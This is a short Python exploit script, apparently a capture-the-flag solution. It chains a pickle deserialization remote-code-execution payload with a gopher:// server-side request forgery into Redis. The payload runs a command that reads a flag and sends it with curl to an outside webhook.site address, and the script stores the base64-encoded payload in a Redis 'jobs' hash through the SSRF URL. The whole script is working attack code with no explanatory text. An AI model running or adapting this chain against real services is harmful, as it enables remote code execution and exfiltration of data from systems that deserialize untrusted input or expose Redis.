import requests 
import pickle
import base64


def generate_payload(cmd):
    class PickleRce(object):
        def __reduce__(self):
            import os
            return os.system, (cmd,)
    payload = pickle.dumps(PickleRce())
    return payload
url = ""

# r = requests.post(url + "/api/login", json = {"username":"admin", "password":"admin"})
# print(r.cookies)
picklePayload = base64.b64encode(
    generate_payload(
        "/readflag > /tmp/flag.txt; curl -d @/tmp/flag.txt https://webhook.site/e4e7d72a-5f56-4bee-89eb-f300c2147ae5"
        
    )
)
print(f"{picklePayload}")

ssrf = "gopher://127.0.0.1:6379/_" + requests.utils.quote(f"HSET jobs 100 {picklePayload.decode()}\nSAVE")
print(ssrf)
# r  = requests.post(url, "api/track/add", json= {"trapName":"ngocdaica", "trapURL": ssrf}, cookies = r.cookies)
# print(r.text)